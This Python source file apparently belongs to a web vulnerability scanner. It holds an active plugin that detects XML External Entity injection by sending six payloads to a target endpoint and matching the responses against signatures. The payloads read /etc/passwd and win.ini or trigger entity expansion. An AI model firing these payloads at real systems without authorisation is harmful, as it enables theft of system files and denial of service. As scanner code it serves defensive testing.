"""
Enterprise XXE Detection Plugin.

Emits DetectionCandidate objects for centralized verification.
"""
import re
import urllib.parse
import time
from typing import List, Union

import structlog

from ...interfaces.active import ActivePluginInterface
from ...passive.models import PluginMetadata
from ...network.http.manager import HTTPClientManager
from ...network.models import HTTPRequest, HTTPResponse
from ...models.finding import Finding, Evidence, VerificationStatus, Severity, Confidence
from ...crawler.models import Endpoint
from ..models import DetectionCandidate, BaselineResult, Payload, PayloadTechnique


logger = structlog.get_logger(__name__)


XXE_PAYLOADS = [
    {
        "name": "basic_entity",
        "content_type": "application/xml",
        "value": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        "marker": r"root:.:0:0:"
    },
    {
        "name": "parameter_entity",
        "content_type": "application/xml",
        "value": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><data>test</data>',
        "marker": r"root:.:0:0:"
    },
    {
        "name": "soap_xxe",
        "content_type": "text/xml",
        "value": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>',
        "marker": r"root:.:0:0:"
    },
    {
        "name": "internal_dtd",
        "content_type": "application/xml",
        "value": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data SYSTEM "file:///nonexistent.dtd"><data>test</data>',
        "marker": r"failed to load external entity|No such file or directory"
    },
    {
        "name": "windows_xxe",
        "content_type": "application/xml",
        "value": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
        "marker": r"\[extensions\]|\[fonts\]"
    },
    {
        "name": "entity_expansion",
        "content_type": "application/xml",
        "value": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;">]><data>&c;</data>',
        "marker": r"1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890"
    },
]

class XXEPlugin(ActivePluginInterface):
    """Enterprise XXE detector emitting unverified candidates."""

    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            id="ACT-XXE-001",
            name="XML External Entity (XXE) Injection",
            description="Detects XXE candidates for centralized verification.",
        )

    async def execute(self, endpoint: Union[str, Endpoint], http_manager: HTTPClientManager) -> List[DetectionCandidate]:
        candidates = []
        client = http_manager.get_shared_client()
        endpoint_url = endpoint.url if not isinstance(endpoint, str) else endpoint

        control_xml = '<?xml version="1.0" encoding="UTF-8"?><data>test</data>'
        control_req = HTTPRequest(method="POST", url=endpoint_url, headers={"Content-Type": "application/xml"}, body=control_xml)
        
        start = time.monotonic()
        control_resp = await client.send(control_req)
        control_elapsed = (time.monotonic() - start) * 1000
        baseline = BaselineResult(request=control_req, response=control_resp, response_time_ms=control_elapsed)
        control_text = control_resp.text if control_resp and isinstance(control_resp.text, str) else ""

        for xxe_def in XXE_PAYLOADS:
            req = HTTPRequest(method="POST", url=endpoint_url, headers={"Content-Type": xxe_def["content_type"]}, body=xxe_def["value"])
            resp = await client.send(req)
            resp_text = resp.text if isinstance(resp.text, str) else ""

            if re.search(xxe_def["marker"], resp_text, re.IGNORECASE):
                if not re.search(xxe_def["marker"], control_text, re.IGNORECASE) or xxe_def["name"] == "internal_dtd":
                    candidate = DetectionCandidate(
                        plugin_id=self.metadata.id,
                        vulnerability_type="xxe",
                        technique=PayloadTechnique.FILE_READ,
                        endpoint=endpoint_url,
                        parameter="XML body",
                        payload=Payload(value=xxe_def["value"], technique=PayloadTechnique.FILE_READ, category="xxe"),
                        baseline=baseline,
                        fuzzed_request=req,
                        fuzzed_response=resp,
                        matched_signature=xxe_def["marker"],
                    )
                    candidates.append(candidate)
                    break

        return candidates
